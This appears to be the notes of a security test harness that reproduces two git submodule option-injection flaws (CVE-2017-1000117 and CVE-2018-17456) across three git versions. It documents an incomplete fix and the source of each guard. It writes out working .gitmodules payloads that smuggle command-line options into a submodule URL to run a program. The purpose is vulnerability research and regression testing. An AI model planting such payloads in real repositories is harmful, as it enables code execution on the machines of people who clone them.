## Bring-up (recipe; no committed images/source; three Git versions compiled from source)
  # Dockerfile build-arg GIT_VER downloads git-<ver>.tar.xz from mirrors.edge.kernel.org
  # and `make prefix=/usr/local NO_GETTEXT=1 install`. openssh-client installed.
  docker compose build                         # tags pcb-git:v0 / v1 / v2
  python3 oracle.py --run-gate                 # build -> plant flag -> gate -> teardown
  #   V0 = git 2.13.4   V1 = git 2.14.1 (target)   V2 = git 2.19.1

## Payloads (.gitmodules submodule value; delivered by victim.sh <url> <path>)
  original (CVE-2017-1000117, ssh-host-dash) : url = ssh://-oProxyCommand=pcb-probe/x   path = sm
  residual (CVE-2018-17456, url-value-dash)  : url = -u/pcb-probe.sh                     path = sm:sm
  # residual: url value begins with '-' (== --upload-pack); the ':' in path routes the
  # positional through the upload-pack transport so the override program executes.

## Differential matrix (real Docker; FLAG_REACHED == benign /pcb-probe.sh ran, echoed flag)
  version         | original (CVE-2017-1000117) | residual (CVE-2018-17456)
  V0 git 2.13.4   | FLAG_REACHED                | FLAG_REACHED
  V1 git 2.14.1   | blocked                     | FLAG_REACHED        <- INCOMPLETE FIX (target)
  V2 git 2.19.1   | blocked                     | blocked

  V1 blocks original : fatal: strange hostname '-oProxyCommand=pcb-probe' blocked   (connect.c guard)
  V2 blocks residual : warning: ignoring 'submodule.sm:sm.url' which may be interpreted
                       as a command-line option: -u/pcb-probe.sh                    (submodule--helper.c "--")
  V2 blocks original : fatal: strange hostname '-oProxyCommand=pcb-probe' blocked

## Guard evolution (verbatim source)
  V0 2.13.4 connect.c git_connect:                 (no dash guard)
  V1 2.14.1 connect.c git_connect (CVE-2017-1000117 fix):
      if (looks_like_command_line_option(ssh_host)) die("strange hostname '%s' blocked", ssh_host);
      (+ same for host/port in git_proxy_connect and for path)      # ssh side only
      int looks_like_command_line_option(const char *str){ return str && str[0] == '-'; }
  V2 2.19.1 builtin/submodule--helper.c clone_submodule (CVE-2018-17456 fix):
      argv_array_push(&cp.args, "--");   /* before <url> <path> -> child git clone stops parsing options */

## Note on the original (ssh) sink under modern OpenSSH
  Modern OpenSSH (>=7.6) independently rejects the crafted hostname before running
  ProxyCommand, so victim.sh plants a modeled pre-7.6 ssh client that honours the
  injected -oProxyCommand. This only lets git's option-injection reach its historical
  sink; git's connect.c guard (V1) blocks the injection BEFORE ssh is invoked, so the
  original's V0->V1 differential is entirely attributable to git. The residual
  (CVE-2018-17456) executes purely within git's child `git clone` and needs no model.

